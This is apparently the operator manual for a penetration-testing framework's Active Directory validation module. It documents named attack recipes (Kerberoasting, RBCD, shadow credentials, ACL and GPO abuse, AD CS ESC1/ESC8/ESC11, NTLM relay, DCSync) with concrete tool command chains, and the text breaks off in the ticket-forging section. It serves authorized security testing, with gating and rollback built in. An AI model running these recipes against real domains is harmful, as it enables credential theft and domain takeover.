# Validation Ops Manual

How to drive PurpleSploit's **validation subsystem** — the operator-driven Active
Directory engagement toolchain (`purplesploit.validation`, PLAN-003). It consumes
detection findings, offers per-issue opt-in validation with recommended-default +
overridable parameters, runs parameterized executors that encode proven
per-technique recipes, and emits `adlab.plan003.proof.v1` receipts that are graded
`proved` / `not-proved` / `inconclusive`.

This manual documents **every registered validation technique** (one section each),
plus the two run modes and the cross-cutting rules (secret handling, mutating
rollback, destructive gate, capability chaining). It is grounded in the code under
`python/purplesploit/validation/`; where a command or behaviour could not be
confirmed from code it is flagged with a `VERIFY` marker.

> Scope: this is for **authorized** engagements / labs only. The recipes were
> proven against the GOAD lab; nothing here is GOAD-specific. See
> [`docs/DISCLAIMER.md`](../DISCLAIMER.md).

---

## 1. Core model

- **Detection in, proof out.** A technique executor encodes one proven recipe as a
  *parameterized* chain of steps, records a **non-secret terminal predicate**, runs
  a **verified rollback** if it mutated AD, and returns an artifact that
  `validation/proof.py` turns into a strict `proof.v1` receipt.
- **`exit 0` is never proof.** Each step's `ok` is decided by a predicate over the
  tool's *output*, not its return code. A missing terminal fact yields a receipt
  the scorer reads as not-proved / inconclusive — never a fabricated proof.
- **Recommended default + override.** Wherever a technique needs an input (a new
  principal, an escalation target, an SPN, a share), the framework proposes a
  concrete default derived from your own inputs, and you may override any of it
  (`--param KEY=VALUE`).
- **Verified vs. unverified recipe.** Each executor declares `verified_recipe`.
  `True` = proven end-to-end in-lab. `False` = **recipe-known, not lab-proven**; it
  ships honest with UNVERIFIED tool-output markers and will report
  not-proved/inconclusive rather than invent a result. The interactive prompt shows
  `UNVERIFIED recipe` for these.
- **Authorization gate.** Mutating ops are gated. With `--unauthorized` the gate
  denies and executors **fail closed** (incomplete receipt, scored
  `inconclusive`/`gate_denied`) — they never work around a denial.

### Terminal-fact vocabulary

Every receipt asserts at most one terminal fact from this controlled set
(`proof.TERMINAL_KINDS`):

`authn_success` · `secret_recovered` · `rbcd_access` · `cert_issued_and_used` ·
`file_write_readback` · `replication_dump` · `share_inventory`

### Secret handling (applies to every technique)

- Recovered credential / hash / key / cert / ticket material is **dropped** from
  the receipt by `proof.scrub()` (any field whose name carries a secret marker is
  removed). The receipt holds vulnerable-entity identities + non-secret predicates
  only.
- Secret-bearing tokens in any stored/previewed command line are masked by
  `redact_argv()` (passwords, `-hashes`, `-H`, `-aesKey`, `user%password`,
  `domain/user:password`).
- In a composed chain, secret products (ccache paths, NT hashes, AES keys,
  looted passwords) are threaded **in-memory only** and never written into a
  report.

---

## 2. Invoking the CLI

The validation CLI is a module entry point (program name `purplesploit-validate`):

```bash
python -m purplesploit.validation.cli <mode> [options]
```

There are three modes. With no subcommand the parser defaults to `pipeline`.

| Mode | Subcommand | What it does |
|------|------------|--------------|
| Enumeration pipeline | `pipeline` | enumerate findings (aranum) → plan → confirm → execute → score |
| Individual run | `run <TECHNIQUE>` | dispatch exactly one technique against an operator-supplied target |
| Composable chain | `chain` | compose a capability path toward a goal state from several edges |

### Shared options (all modes)

```
--domain DOMAIN            (required) AD domain FQDN
--dc-ip DC_IP              (required) domain controller IP
--user USER                principal (NORTH\joe, joe@north.local, or joe)
--password PASSWORD        cleartext password
--hash HASH                NTLM hash (LM:NT or :NT)
--aes-key AES_KEY          Kerberos AES key
--target TARGET            extra target host (repeatable; see per-technique meaning in `run`)
--output ./validation-run  output dir for receipts / ccache / chain report
--aranum-bin aranum        detection tool binary (pipeline)
--nmap FILE                nmap output fed to `aranum run -i` (pipeline; required unless --findings-json)
--findings-json FILE       pre-existing aranum findings.json (skip enumeration)
--score-proof 'ARGV'       argv that runs adlab.score_proof (omit -> receipts only, no scoring)
--proof-truth FILE         adlab.plan003.proof-truth.v1 facet JSON (scoring truth)
--host-alias RAW=HOSTID    identity mapping for scoring (repeatable), e.g. 10.0.0.10=dc01
--unauthorized             mark engagement NOT authorized (gates deny -> fail closed)
--yes                      accept recommended defaults non-interactively (implemented + verified only)
--allow-destructive        pre-authorize destructive ops for a NON-INTERACTIVE (--yes) run (see §4)
--timeout 300              per-tool timeout (seconds)
--forge-key-file FILE      file holding the hex signing key for T4 ticket forging (see §8)
--forge-key-kind {aes,nt}  how to pass the forge key to ticketer (default aes)
--forge-key-nt-file FILE   file holding the krbtgt NT hash (Sapphire needs both AES and NT)
```

**Credentials.** The authenticated techniques read `--user` plus one of
`--password` / `--hash` / `--aes-key`. When more than one is supplied the method
precedence is hash → aes-key → password. A chain that needs credentials checks them
and fails closed if absent.

### Individual run

```bash
python -m purplesploit.validation.cli run <TECHNIQUE> \
  --domain <d> --dc-ip <ip> --user <u> --password <p> \
  [--target <T>] [--param KEY=VALUE ...] [--yes]
```

- `<TECHNIQUE>` is case-insensitive and must be one of the registered techniques
  (§5–§9).
- `--target` sets the technique's **primary target parameter** (the mapping differs
  per technique — see each section's "run" line; e.g. for `RBCD` it fills
  `delegate_to`, for `KERBEROAST` it fills `principal`).
- `--param KEY=VALUE` overrides any parameter from that technique's `param_specs`.
  Unknown keys and missing required params are rejected **before** any tool runs.
- At most one `--target` is accepted in `run` mode.

### Composable chain

```bash
python -m purplesploit.validation.cli chain \
  --domain <d> --dc-ip <ip> --user <u> --password <p> \
  --goal <STATE> [--allow-crack] [--allow-destructive] \
  [--map TECH=TARGET ...] [--param TECH.KEY=VALUE ...]
```

- `--goal` is a capability **state** (default `S_DA`). Valid base states:
  `S0_user_creds`, `dc_tgt`, `da_creds`, `krbtgt`, `S_DA`, `S_coerced_auth`,
  `S_computer_control`, `S_rbcd_write`, `S_impersonation_tgt`, `S_acl_control`,
  `S_acl_cred`, `S_persistence`, `S_looted_creds` (plus parameterized forms like
  `cred:<host>` / `control:<host>`).
- `--map TECH=TARGET` binds an edge's target; `--param TECH.KEY=VALUE` sets a
  per-edge parameter (e.g. `--param WRITE-DACL.trustee=operator`).
- All bindings are validated **before any mutation**. `DCSYNC` gets an explicit DC
  binding by default.
- Only **capability-annotated** edges (those with both `pre` and `eff`) participate
  in a composed path; destructive edges require `--allow-destructive`, crack-dependent
  edges require `--allow-crack`. The eleven non-annotated techniques (RBCD,
  KERBEROAST, ASREP, LAPS, CONSTRAINED-DELEG-PT, OPENSHARES-WRITE, SHADOW-CREDS,
  ADCS-ESC1, COERCION, NTLM-RELAY, UNCONSTRAINED-DELEG) are **run/pipeline only**.

### Exit codes

- Scored run/pipeline: `0` proved, `1` not-proved, `2` inconclusive.
- Unscored `run` (no `--score-proof`): `0` if the receipt is `complete`, else `1`.
- `chain`: `0` if the goal was reached, else `1`.
- Input error (`2`): bad parameter / unknown goal / unknown technique.

---

## 3. Mutating techniques & rollback

A technique with `mutating=True` changes AD and carries a **verified rollback**: it
undoes its change and then positively confirms the undo (e.g. an ACE removed *and*
read back absent). The receipt's `mutation` block records
`{applied, rollback:{performed, method, verified}}`. When run as a composable
*front*, a mutating edge DEFERS its rollback to chain teardown so downstream edges
can consume the key material; the engine requires `verified` before it calls a
chain "clean".

## 4. Destructive techniques & the confirmation gate

A technique with `destructive=True` is **irreversible and/or executes code on a live
host** (FORCE-CHANGE-PASSWORD, GENERIC-ALL, GPO-ABUSE). It is gated twice:

1. **Static engine filter** — a destructive edge is excluded from a composed chain
   search unless `--allow-destructive`.
2. **Per-call runtime gate** — at the moment the destructive op would fire:
   - *Interactive run:* a loud warning + a prompt requiring an exact `yes`
     (fail-closed on EOF).
   - *Non-interactive run (`--yes`):* proceeds only if `--allow-destructive` is set;
     otherwise it refuses. Never a silent bypass — the warning always prints.

---

## 5. Kerberos roasting & cracking

### KERBEROAST (class `kerberoast`, terminal `authn_success`, non-mutating, verified)

Requests a service ticket for a roastable SPN account, cracks the `$krb5tgs$` hash
offline, and re-authenticates as that account — the successful login is the proof.

- **Recipe:** `#66146 KERBEROAST = impacket-GetUserSPNs -request -> $krb5tgs$ -> hashcat -m 13100 rockyou -> reauth nxc smb (PROVED jon.snow)`
- **Prerequisites:** any domain user creds (`--user` + password/hash/aes-key). Read-only. Offline cracking is opt-in.
- **Run:** `--target` → `principal`.
  ```bash
  python -m purplesploit.validation.cli run KERBEROAST \
    --domain <d> --dc-ip <ip> --user <u> --password <p> --target <roastable_account>
  ```
  Params: `principal`, `wordlist` (default Kali rockyou), `reauth_target` (default DC).
- **Receipt:** `authn_success` with a login-as-`principal` predicate. The cracked password never enters the receipt.

### ASREP (class `asrep`, terminal `authn_success`, non-mutating, verified)

Roasts an account with Kerberos pre-auth disabled, cracks the AS-REP hash offline,
re-authenticates.

- **Recipe:** `#66146 ASREP = impacket-GetNPUsers -request -> hashcat -m 18200 -> reauth (PROVED brandon.stark + missandei)`
- **Prerequisites:** domain context; the target account must have "do not require
  pre-auth" set. Read-only.
- **Run:** `--target` → `principal`. Params: `principal`, `wordlist`, `reauth_target`.
  ```bash
  python -m purplesploit.validation.cli run ASREP \
    --domain <d> --dc-ip <ip> --user <u> --password <p> --target <preauth_disabled_user>
  ```
- **Receipt:** `authn_success`. Cracked secret stays out of the receipt.

### TARGETED-KERBEROAST (class `acl`, terminal `authn_success`, mutating, verified)

Uses an already-held `GenericAll`/`GenericWrite` ACE over a victim to **write an SPN**
onto it, Kerberoast it, crack offline, and re-authenticate; then rolls back the SPN.

- **Recipe:** `T3 TARGETED-KERBEROAST = dacledit read (confirm precondition GenericAll/GenericWrite) ; bloodyAD set object servicePrincipalName ; impacket-GetUserSPNs -request -> $krb5tgs$ ; gate offline_crack ; hashcat -m 13100 ; nxc smb reauth (= the terminal) ; ROLLBACK: clear SPN + positive_absence readback`
- **Prerequisites:** domain creds + a confirmed write-ACE over the victim. **Mutating** — writes then clears a `servicePrincipalName`; rollback verified by positive-absence read-back.
- **Run:** `--target` → `victim`. Params: `victim`, `spn` (default `http/<victim>`), `wordlist`, `reauth_target`.
  ```bash
  python -m purplesploit.validation.cli run TARGETED-KERBEROAST \
    --domain <d> --dc-ip <ip> --user <u> --password <p> --target <victim_principal>
  ```
- **Chain edge:** `pre={S0_user_creds}` → `eff={S_acl_cred}`.
- **Receipt:** `authn_success`; `mutation.rollback.verified=true`.

---

## 6. Delegation abuse (S4U)

### RBCD (class `delegation`, terminal `rbcd_access`, mutating, verified)

Creates a controlled computer account, writes resource-based constrained delegation
on the victim, requests an S4U impersonation ticket, and uses it — then flushes the
RBCD and deletes the computer.

- **Recipe:** `#66146 RBCD = addcomputer ; rbcd -action write ; getST -spn cifs/<victim> -impersonate <principal> ; nxc smb -k ; ROLLBACK rbcd flush + addcomputer -delete`
- **Prerequisites:** domain creds able to create a computer (MachineAccountQuota > 0) and write the victim's `msDS-AllowedToActOnBehalfOfOtherIdentity`. **Mutating** — creates a computer + writes RBCD; rollback flushes the SD and deletes the computer.
- **Run:** `--target` → `delegate_to` (use the **hostname**, not an IP, so `computer$` resolves). Params: `new_computer` (default `<user>_cmp_delegation`), `delegate_to`, `impersonate` (default `Administrator`), `target_spn` (default `cifs/<victim>`).
  ```bash
  python -m purplesploit.validation.cli run RBCD \
    --domain <d> --dc-ip <ip> --user <u> --password <p> --target <victim_host>
  ```
- **Receipt:** `rbcd_access` (ticket-backed access proven); `mutation.rollback.verified=true`.

### CONSTRAINED-DELEG-PT (class `delegation`, terminal `authn_success`, non-mutating, verified)

Uses an existing constrained-delegation principal (holds `msDS-AllowedToDelegateTo`)
to request an S4U ticket impersonating a high-value principal, then accesses the
target with it. Non-mutating — it exercises an existing delegation, it does not
create one.

- **Recipe:** `#66146 CONSTRAINED-DELEG-PT = impacket-getST -spn <allowed_spn> -impersonate <HVT> <dom>/<deleg>:<pw> (unset KRB5CCNAME) -> nxc smb <t> -k --use-kcache (PROVED jon.snow -> Administrator)`
- **Prerequisites:** creds for the delegation-enabled principal; the requested SPN must be in its `msDS-AllowedToDelegateTo`. Read-only.
- **Run:** `--target` → `target_host`. Params: `deleg_principal` (default `--user`), `impersonate` (default `Administrator`), `target_spn` (default `cifs/<host>`), `target_host`.
  ```bash
  python -m purplesploit.validation.cli run CONSTRAINED-DELEG-PT \
    --domain <d> --dc-ip <ip> --user <deleg> --password <p> --target <target_host>
  ```
- **Receipt:** `authn_success` as the impersonated principal.

### UNCONSTRAINED-DELEG (class `delegation`, terminal `replication_dump`, non-mutating, **unverified**)

On a controlled unconstrained-delegation host, runs a TGT-capture listener, coerces
a DC to authenticate, captures its machine-account ccache, and DCSyncs with it.

- **Recipe:** `#66146 C5 UNCONSTRAINED-DELEG = start krbrelayx on controlled unconstrained host ; coerce <victim_dc> -> capture <DC>$.ccache ; secretsdump -k -no-pass DCSync (recipe-known, NOT lab-proven)`
- **Prerequisites:** a controlled host with unconstrained delegation; a coercible DC. Read-only (DCSync is a read). `verified_recipe=False` — ships with UNVERIFIED markers.
- **Run:** `--target` → `victim_dc`. Params: `victim_dc`, `unconstrained_host` (operator-supplied; empty = local listener), `listener_host`, `method` (`auto`/`petitpotam`/`printerbug`/`dfscoerce`).
  ```bash
  python -m purplesploit.validation.cli run UNCONSTRAINED-DELEG \
    --domain <d> --dc-ip <ip> --user <u> --password <p> --target <victim_dc> \
    --param unconstrained_host=<controlled_host>
  ```
- **Receipt:** `replication_dump` (krbtgt replicated). Captured ccache/secrets stay out of the receipt.

---

## 7. Credential exposure

### LAPS (class `laps`, terminal `authn_success`, non-mutating, **unverified login**)

Reads a member host's LAPS-managed local-admin password, then logs in with it.

- **Recipe:** `#66146 LAPS = impacket-GetLAPSPassword -> login (READ proved braavos; login inconclusive: AD attr not synced to local SAM in GOAD)`
- **Prerequisites:** domain creds with permission to read the host's LAPS attribute. Read-only. `verified_recipe=False` (read proved; the login leg is inconclusive in-lab — documented honestly).
- **Run:** `--target` → `target_host`. Params: `target_host`, `local_admin` (default `administrator`).
  ```bash
  python -m purplesploit.validation.cli run LAPS \
    --domain <d> --dc-ip <ip> --user <u> --password <p> --target <member_host>
  ```
- **Receipt:** `authn_success` (local-auth login). The LAPS password is scrubbed.

### SHADOW-CREDS (class `shadow_creds`, terminal `secret_recovered`, mutating, verified)

Adds a Key Credential (`msDS-KeyCredentialLink`) to a victim account, PKINITs to
recover the account's NT hash, then auto-restores the attribute.

- **Recipe:** `#66146 SHADOW-CREDS = certipy-ad shadow auto -account <victim$> (add msDS-KeyCredentialLink -> PKINIT -> NT hash -> auto-restore) (PROVED braavos$)`
- **Prerequisites:** domain creds with write over the victim's `msDS-KeyCredentialLink`. **Mutating** — `certipy shadow auto` adds then auto-restores the link.
- **Run:** `--target` → `account` (defaults to the finding host's computer account `<shortname>$`; override for a user account). Param: `account`.
  ```bash
  python -m purplesploit.validation.cli run SHADOW-CREDS \
    --domain <d> --dc-ip <ip> --user <u> --password <p> --target '<victim$>'
  ```
- **Receipt:** `secret_recovered` (a secret was recovered via PKINIT); the recovered NT hash is scrubbed.

---

## 8. ACL / object takeover (T3)

All seven ACL techniques begin by confirming the **precondition ACE** with
`impacket-dacledit -action read` before any write, and (where mutating) end with a
verified rollback. Each needs an already-held control right over the target object.

### WRITE-DACL (class `acl`, terminal `file_write_readback`, mutating, verified)

Rewrites the target object's DACL to grant yourself a right; the positive read-back
of the new ACE is the terminal. Rolls the ACE back.

- **Recipe:** `T3 WRITE-DACL = impacket-dacledit -action read (confirm precondition WriteDacl/FullControl/GenericAll) ; -action write -ace-type grant -rights <rights> -principal <trustee> ; -action read (POSITIVE readback = the terminal) ; ROLLBACK -action remove + read-back`
- **Prerequisites:** domain creds + a held `WriteDacl`/`FullControl`/`GenericAll` ACE over the target. **Mutating**, rollback verified.
- **Run:** `--target` → `target`. Params: `target`, `trustee` (default `--user`), `rights` (default `FullControl`; choices `FullControl`/`GenericAll`).
  ```bash
  python -m purplesploit.validation.cli run WRITE-DACL \
    --domain <d> --dc-ip <ip> --user <u> --password <p> --target <ad_object>
  ```
- **Chain edge:** `pre={S0_user_creds}` → `eff={S_acl_control}`.

### WRITE-OWNER (class `acl`, terminal `file_write_readback`, mutating, verified)

Takes ownership of the target, then grants itself FullControl via a new ACE; rolls
back both the ACE and the original owner, both verified.

- **Recipe:** `T3 WRITE-OWNER = dacledit read (confirm precondition WriteOwner/FullControl/GenericAll) ; owneredit read (capture baseline owner) ; owneredit write -new-owner <trustee> ; dacledit write -rights FullControl -principal <trustee> ; dacledit read (POSITIVE readback = the terminal) ; ROLLBACK: remove ACE + restore original owner, BOTH verified`
- **Prerequisites:** domain creds + a held `WriteOwner`/`FullControl`/`GenericAll` ACE. **Mutating**, two-part verified rollback.
- **Run:** `--target` → `target`. Params: `target`, `trustee` (default `--user`).
  ```bash
  python -m purplesploit.validation.cli run WRITE-OWNER \
    --domain <d> --dc-ip <ip> --user <u> --password <p> --target <ad_object>
  ```
- **Chain edge:** `pre={S0_user_creds}` → `eff={S_acl_control}`.

### ADD-MEMBER / ADD-SELF (class `acl`, terminal `file_write_readback`, mutating, verified)

Adds a principal (default: yourself — ADD-SELF) to a group you hold a membership-write
right over; the `memberOf` read-back is the terminal. Rolls back the membership.

- **Recipe:** `T3 ADD-MEMBER/ADD-SELF = dacledit read (confirm precondition Self-Membership/GenericWrite/GenericAll over the GROUP) ; bloodyAD add groupMember ; nxc ldap --query memberOf (POSITIVE readback = the terminal) ; ROLLBACK: remove groupMember + positive_absence readback`
- **Prerequisites:** domain creds + a held Self-Membership/`GenericWrite`/`GenericAll` ACE over the group. **Mutating**, rollback verified.
- **Run:** `--target` → `group`. Params: `group`, `member` (default `--user`).
  ```bash
  python -m purplesploit.validation.cli run ADD-MEMBER \
    --domain <d> --dc-ip <ip> --user <u> --password <p> --target <group> \
    --param member=<principal>
  ```
- **Chain edge:** `pre={S0_user_creds}` → `eff={S_acl_control}`.

### FORCE-CHANGE-PASSWORD (class `acl`, terminal `authn_success`, mutating, **destructive**, verified)

Resets the victim's password using a `User-Force-Change-Password` right, then logs in
as them. **Irreversible — the original password cannot be restored.**

- **Recipe:** `T3 FORCE-CHANGE-PASSWORD = dacledit read (confirm precondition User-Force-Change-Password/GenericAll) ; DESTRUCTIVE-CONFIRM gate ; bloodyAD set password ; nxc smb reauth (= the terminal) ; ROLLBACK: deliberately NONE, by design`
- **Prerequisites:** domain creds + the force-change-password right (or `GenericAll`). **Destructive** — passes the §4 confirmation gate; **rollback is deliberately NONE**.
- **Run:** `--target` → `victim`. Param: `victim`. Non-interactive runs need `--allow-destructive`.
  ```bash
  python -m purplesploit.validation.cli run FORCE-CHANGE-PASSWORD \
    --domain <d> --dc-ip <ip> --user <u> --password <p> --target <victim> \
    --yes --allow-destructive
  ```
- **Chain edge:** `pre={S0_user_creds}` → `eff={S_acl_cred}` (needs `--allow-destructive`).
- **Receipt:** `authn_success`; the new password is scrubbed.

### GENERIC-ALL (class `acl`, terminal varies, mutating, **destructive**, verified)

With a confirmed `GenericAll`/`GenericWrite` ACE, exercises one already-proven pivot
recipe. The terminal kind follows the pivot.

- **Recipe:** `T3 GENERIC-ALL = dacledit read (confirm precondition GenericAll/GenericWrite) ; pivot in {reset_password, spn_kerberoast, shadow_creds, rbcd} -- each pivot reuses an already-proven T3/T1b/FULL recipe shape`
- **Pivots & terminal:** `shadow_creds` → `secret_recovered` (default; the only non-destructive, crack-free pivot), `reset_password` → `authn_success` (destructive, no rollback), `spn_kerberoast` → `authn_success` (roast+crack, rolls back), `rbcd` → `rbcd_access` (S4U, rolls back).
- **Prerequisites:** domain creds + a confirmed `GenericAll`/`GenericWrite` ACE over the target. Class-level **destructive** (conservative, because the `reset_password` pivot is irreversible); the per-call gate still fires only on a destructive pivot.
- **Run:** `--target` → `target`. Params: `target`, `pivot` (default `shadow_creds`; choices `reset_password`/`spn_kerberoast`/`shadow_creds`/`rbcd`), `new_computer` (`rbcd` pivot), `impersonate` (`rbcd` pivot), `spn` (`spn_kerberoast` pivot), `wordlist` (`spn_kerberoast` pivot).
  ```bash
  python -m purplesploit.validation.cli run GENERIC-ALL \
    --domain <d> --dc-ip <ip> --user <u> --password <p> --target <object> \
    --param pivot=shadow_creds
  ```
- **Chain edge:** `pre={S0_user_creds, S_acl_control}` → `eff={S_acl_cred, S_impersonation_tgt}` (accepts a threaded control grant; needs `--allow-destructive`).

### GPO-ABUSE (class `acl`, terminal `file_write_readback`, mutating, **destructive**, **unverified**)

With `GenericAll`/`GenericWrite` over a GPO object, deploys an immediate SYSTEM-context
scheduled task to the GPO's linked computers (a harmless uniquely-marked proof
command), confirms the write by read-back, bumps `versionNumber`, and (if a linked
host is given) best-effort confirms execution. Byte-identical restore on rollback,
with `versionNumber` only ever bumped forward (never decremented).

- **Recipe:** `T3 GPO-ABUSE = dacledit read (confirm precondition GenericAll/GenericWrite over the GPO AD object) ; DESTRUCTIVE-CONFIRM gate ; nxc --get-file baseline ScheduledTasks.xml ; nxc --put-file malicious immediate SYSTEM task ; nxc --get-file readback = task write confirmed ; bloodyAD bump versionNumber ; best-effort exercise poll if linked_host given ; ROLLBACK byte-identical restore + versionNumber bumped forward again (monotonic, never decremented)`
- **Prerequisites:** domain creds + `GenericAll`/`GenericWrite` over the GPO object. **Destructive** (code-exec side effect) — §4 gate applies. `verified_recipe=False`, the most unverified of the ACL set.
- **Run:** `--target` → `gpo_guid`. Params: `gpo_guid`, `dc_host` (default DC), `linked_host` (optional — narrower proof without it: task write + versionNumber bump only).
  ```bash
  python -m purplesploit.validation.cli run GPO-ABUSE \
    --domain <d> --dc-ip <ip> --user <u> --password <p> --target <gpo_guid> \
    --yes --allow-destructive
  ```
- **Chain edge:** `pre={S0_user_creds}` → `eff={S_acl_control}` (needs `--allow-destructive`).

---

## 9. AD CS (certificate abuse)

### ADCS-ESC1 (class `adcs`, terminal `cert_issued_and_used`, mutating, verified)

Requests a certificate on a vulnerable ESC1 template with a high-value principal in
the SAN/UPN, PKINITs with the issued PFX to get a TGT + NT hash, and uses it.

- **Recipe:** `#66146 C1 ADCS-ESC1 = certipy-ad req -template <ESC1> -upn <impersonate>@<dom> -ca <CA> -target <cahost> [-ldap-scheme ldap] (issue pfx+serial) ; certipy-ad auth -pfx -> PKINIT TGT+NThash ; nxc smb -k ; ROLLBACK destroy issued .pfx/.ccache key material (certipy has no revoke; #66157) (PROVED essos ESSOS-CA)`
- **Prerequisites:** domain creds with enroll rights on the ESC1 template. **Mutating** (a cert is issued) — rollback destroys the issued key material (certipy has no revoke; CA-DB Certificate Hold is a follow-up).
- **Run:** `--target` → `ca_host`. Params: `template` (default `ESC1`), `ca`, `ca_host`, `impersonate` (default `Administrator`), `target_host`, `ldap_scheme` (`''`/`ldap`/`ldaps` — force plain `ldap` for a Win2016 CA whose LDAPS resets).
  ```bash
  python -m purplesploit.validation.cli run ADCS-ESC1 \
    --domain <d> --dc-ip <ip> --user <u> --password <p> --target <ca_host> \
    --param ca=<CA_NAME> --param template=<ESC1_TEMPLATE>
  ```
- **Receipt:** `cert_issued_and_used`; PFX / NT hash scrubbed.

### ESC8 (class `adcs`, terminal `cert_issued_and_used`, mutating, **unverified**)

Coerce → relay → CA (HTTP Web-Enrollment). Starts an `ntlmrelayx --adcs` listener
against `certsrv/certfnsh.asp`, coerces a privileged machine, relays its auth to get
a DC/machine certificate, then PKINITs. Shares the listener chassis with COERCION /
NTLM-RELAY.

- **Recipe:** `N1 ESC8 = ntlmrelayx -t http://<ca_host>/certsrv/certfnsh.asp --adcs --template DomainController ; coerce <victim_dc> ; PKINIT with the issued pfx ; ROLLBACK destroy key material (recipe-known, NOT lab-proven)`
- **Prerequisites:** domain creds; a coercible privileged machine; CA Web-Enrollment reachable without EPA. **Mutating** (cert issued) — rollback destroys key material. `verified_recipe=False`.
- **Run:** `--target` → `ca_host`. Params: `ca_host`, `victim_dc` (default = CA host), `listener_host` (empty = framework-managed), `template` (default `DomainController`), `method` (`auto`/`petitpotam`/`printerbug`/`dfscoerce`).
  ```bash
  python -m purplesploit.validation.cli run ESC8 \
    --domain <d> --dc-ip <ip> --user <u> --password <p> --target <ca_host> \
    --param victim_dc=<dc_host>
  ```
- **Chain edge:** `pre={S0_user_creds}` → `eff={dc_tgt}` (feeds DCSync).

### ESC11 (class `adcs`, terminal `cert_issued_and_used`, mutating, **unverified**)

ESC8's RPC-transport sibling: relays to the CA's RPC enrollment interface (MS-ICPR)
when request encryption is not enforced. Identical chassis otherwise.

- **Recipe:** `N1 ESC11 = ntlmrelayx -t rpc://<ca_host> -rpc-mode ICPR -icpr-ca-name <ca> --adcs ; coerce <victim_dc> ; PKINIT with the issued pfx ; ROLLBACK destroy key material (recipe-known, NOT lab-proven)`
- **Prerequisites:** as ESC8, plus the CA's RPC/ICPR interface reachable without enforced request encryption. **Mutating**, `verified_recipe=False`.
- **Run:** `--target` → `ca_host`. Params: `ca_host`, `victim_dc`, `listener_host`, `template`, `method`, **plus `ca`** (the issuing CA name, required for `-icpr-ca-name`).
  ```bash
  python -m purplesploit.validation.cli run ESC11 \
    --domain <d> --dc-ip <ip> --user <u> --password <p> --target <ca_host> \
    --param ca=<CA_NAME> --param victim_dc=<dc_host>
  ```
- **Chain edge:** `pre={S0_user_creds}` → `eff={dc_tgt}`.

### CERTIFRIED (CVE-2022-26923) (class `adcs`, terminal `cert_issued_and_used`, mutating, **unverified**)

Creates a computer account, sets its `dNSHostName` to the DC's (the CVE spoof),
enrolls a Machine cert as the DC, PKINITs as the DC, then deletes the computer with a
positive LDAP read-back.

- **Recipe:** `N1 CERTIFRIED (CVE-2022-26923) = certipy account create -dns <dc_fqdn> (MAQ>0) ; certipy req -template Machine -ca <ca> -target <ca_host> ; certipy auth -pfx (PKINIT as DC) ; ROLLBACK delete computer + positive LDAP read-back + destroy pfx (recipe-known, NOT lab-proven)`
- **Prerequisites:** domain creds able to create a computer (MachineAccountQuota > 0); an AD CS CA. **Mutating** (computer created + cert issued) — rollback deletes the computer (verified bind-ok AND computer-absent) and destroys the PFX. `verified_recipe=False`.
- **Run:** `--target` → `ca_host`. Params: `ca_host`, `ca`, `new_computer` (default `<user>_cmp_certifried`), `dc_fqdn` (the DC FQDN to spoof — operator-supplied, no default).
  ```bash
  python -m purplesploit.validation.cli run CERTIFRIED \
    --domain <d> --dc-ip <ip> --user <u> --password <p> --target <ca_host> \
    --param ca=<CA_NAME> --param dc_fqdn=<dc.fqdn>
  ```
- **Chain edge:** `pre={S0_user_creds}` → `eff={dc_tgt}`.

---

## 10. Coercion & relay

### COERCION (class `coerce`, terminal `authn_success`, non-mutating, **unverified**)

Starts a capture listener and triggers a coercion (Coercer / PetitPotam / PrinterBug
/ DFSCoerce) so the victim DC authenticates to it; the captured machine-account auth
is the proof. Non-mutating, no rollback.

- **Recipe:** `#66146 C8 COERCION = start capture listener ; Coercer/PetitPotam/printerbug trigger at <victim_dc> -> <listener_host> ; captured <DC>$ auth is the proof (recipe-known, NOT lab-proven)`
- **Prerequisites:** a coercible host; a reachable listener interface. Read-only. `verified_recipe=False`.
- **Run:** `--target` → `victim_dc`. Params: `victim_dc`, `listener_host` (empty = framework-managed on the local interface), `method` (`auto`/`petitpotam`/`printerbug`/`dfscoerce`).
  ```bash
  python -m purplesploit.validation.cli run COERCION \
    --domain <d> --dc-ip <ip> --user <u> --password <p> --target <victim_dc>
  ```
- **Receipt:** `authn_success` (captured auth).

### NTLM-RELAY (class `relay`, terminal `replication_dump` or `rbcd_access`, mode-dependent, **unverified**)

Runs an `ntlmrelayx` listener + coercion and relays the coerced auth. Two modes:
`smb_sam` (relay → SMB, dump SAM, **read-only**) or `ldap_rbcd` (relay → LDAP, write
RBCD, **mutating** with a verified flush rollback).

- **Recipe:** `#66146 C2 NTLM-RELAY = ntlmrelayx listener + coercion -> relay; smb_sam: -t smb:// -l <loot> -> SAM dump (replication_dump, read); ldap_rbcd: -t ldap:// --delegate-access -> RBCD write (rbcd_access, MUTATING -> verified flush rollback) (recipe-known, NOT lab-proven)`
- **Prerequisites:** a coercible host; a signing-off relay target. `smb_sam` is read-only; `ldap_rbcd` is mutating. `verified_recipe=False`.
- **Run:** `--target` → `relay_target`. Params: `relay_target`, `mode` (default `smb_sam`; choices `smb_sam`/`ldap_rbcd`), `victim_dc` (default = relay target), `listener_host`, `method`.
  ```bash
  python -m purplesploit.validation.cli run NTLM-RELAY \
    --domain <d> --dc-ip <ip> --user <u> --password <p> --target <relay_target> \
    --param mode=smb_sam
  ```
- **Receipt:** `smb_sam` → `replication_dump` (SAM hashes, scrubbed); `ldap_rbcd` → `rbcd_access` with `mutation.applied=true` + verified flush rollback.

---

## 11. Replication

### DCSYNC (class `dcsync`, terminal `replication_dump`, non-mutating, verified)

DRSUAPI-replicates the krbtgt secret from a DC — the universal, non-destructive Domain
Admin proof and the reusable terminal the chain engine composes toward.

- **Recipe:** `N1 DCSYNC (b1) = impacket-secretsdump -just-dc-user krbtgt <ctx creds/hash/-k>@<dc_host> ; terminal = krbtgt replicated (read-only, no rollback; the reusable DA terminal C composes)`
- **Prerequisites:** DA-equivalent replication rights (DA creds) **or** a DC-context TGT threaded from an upstream front (`dc_tgt`). Read-only.
- **Run:** `--target` → `dc_host` (defaults to `--dc-ip`). Param: `dc_host`.
  ```bash
  python -m purplesploit.validation.cli run DCSYNC \
    --domain <d> --dc-ip <ip> --user <da_user> --password <p>
  ```
- **Chain edge:** `pre={dc_tgt, da_creds}` (either satisfies) → `eff={krbtgt, S_DA}`. This is the standard chain goal terminal.
- **Receipt:** `replication_dump`; the replicated krbtgt secret is scrubbed.

---

## 12. Kerberos ticket forging (T4)

All four forge a ticket **offline** and re-authenticate with it (`nxc --use-kcache`);
the forged-ticket login is the terminal. Non-mutating (no AD change). The **signing
key is a secret**: for standalone dispatch supply it via a file so it never appears
in argv / a preview:

```
--forge-key-file <file>       # the hex krbtgt or service key
--forge-key-kind {aes,nt}     # how to pass it to ticketer (default aes)
--forge-key-nt-file <file>    # the krbtgt NT hash (Sapphire needs both AES + NT)
